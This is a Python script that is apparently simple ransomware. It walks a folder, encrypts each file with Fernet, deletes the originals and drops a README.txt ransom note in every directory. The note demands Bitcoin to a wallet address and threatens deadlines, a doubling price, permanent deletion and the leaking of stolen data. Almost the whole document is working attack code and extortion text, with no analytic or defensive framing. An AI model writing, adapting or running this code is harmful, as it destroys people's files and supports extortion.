import os
from cryptography.fernet import Fernet


def load_key():
    return open("secret.key", "rb").read()


def encrypt_file(file_name):
    key = load_key()
    f = Fernet(key)
    with open(file_name, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)

    with open(file_name + ".enc", "wb") as file:
        file.write(encrypted_data)

    os.remove(file_name)


def create_indicator_file(folder_path):
    indicator_file_path = os.path.join(folder_path, "README.txt")
    with open(indicator_file_path, "w") as f:
        f.write("""
!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!

What happened?
All your files have been locked with military-grade encryption. Unfortunately, you will not be able to access your data without our decryption tool. We can guarantee that there is no way to recover your files without paying the ransom.

How to recover your files?

1. Download and install a Bitcoin wallet.
2. Purchase 0.5 BTC from a trusted exchange (we recommend DollarCrypto or MetaMoney). For instructions on how to buy Bitcoin, visit [LINK].
3. Send the Bitcoin to the following address: BTCWallet12345xyz
4. Once the payment is confirmed, email us at MWS_ransom@darkmail.com with your transaction ID.
5. We will send you the decryption tool and instructions on how to use it.

Need proof?
If you’re unsure about paying, we can decrypt 1-2 small files for free to prove that we can unlock your data. Email us at MWS_ransom@darkmail.com with your request.

How much time do I have?
You have 72 hours to make the payment. After that, the price will double to 1 BTC. If no payment is made within 7 days, all your files will be **deleted permanently**.

### Additional Warning!
If you fail to comply within the given time, not only will your files be lost forever, but we will also **leak sensitive information** from your system to the public or sell it on the dark web. Your private data may end up in the hands of malicious third parties, and we are not responsible for the consequences. 

Important!

- Do not attempt to use third-party decryption tools as they may cause irreversible damage to your files.
- If you try to delete or modify any of the encrypted files, they will be lost forever.
- Contact us only using the provided email address. We will not respond to other channels.

Thank you for your cooperation, and remember, we are only interested in the money, not your personal data. However, failure to comply may result in serious consequences.

- The MWS Team
""")


def encrypt_folder(folder_path):
    for dirpath, _, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            print(f"Encrypting: {file_path}")
            encrypt_file(file_path)


        create_indicator_file(dirpath)


encrypt_folder(r"E:\project\Malware\MWS\test")
